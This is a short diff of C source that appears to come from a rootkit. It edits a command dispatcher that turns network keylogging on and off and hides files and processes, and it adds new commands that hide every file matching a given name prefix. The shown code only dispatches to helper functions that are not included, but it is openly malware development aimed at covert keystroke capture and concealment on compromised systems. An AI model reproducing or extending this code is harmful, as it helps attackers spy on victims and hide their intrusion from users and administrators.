@@ -23,22 +23,32 @@ execute_command (void)
 	int port;
 	pid_t pid;
 
-        if(strcmp(command_buffer, "enable_netlog") == 0) {
-                if(param_counter > 0) {
-                        enable_net_keylog(param_buffer);
-                }
-        }
-        else if(strcmp(command_buffer, "disable_netlog") == 0) {
-                        disable_net_keylog();
-                }
-
-	if(strcmp(command_buffer, "hide_file") == 0) {
+	if(strcmp(command_buffer, "enable_netlog") == 0) {
+		if(param_counter > 0) {
+			enable_net_keylog(param_buffer);
+		}
+		
+	} else if(strcmp(command_buffer, "disable_netlog") == 0) {
+		disable_net_keylog();
+		
+	} else if(strcmp(command_buffer, "hide_file") == 0) {
 		if(param_counter > 0) {
 			hide_file_path(param_buffer);
 		}
+		
 	} else if(strcmp(command_buffer, "unhide_file") == 0) {
 		if(param_counter > 0) {
 			unhide_file_path(param_buffer);
+		}
+		
+	} else if(strcmp(command_buffer, "hide_fprefix") == 0) {
+		if(param_counter > 0) {
+			hide_file_prefix(param_buffer);
+		}
+		
+	} else if(strcmp(command_buffer, "unhide_fprefix") == 0) {
+		if(param_counter > 0) {
+			unhide_file_prefix(param_buffer);
 		}
 		
 	} else if(strcmp(command_buffer, "hide_process") == 0) {
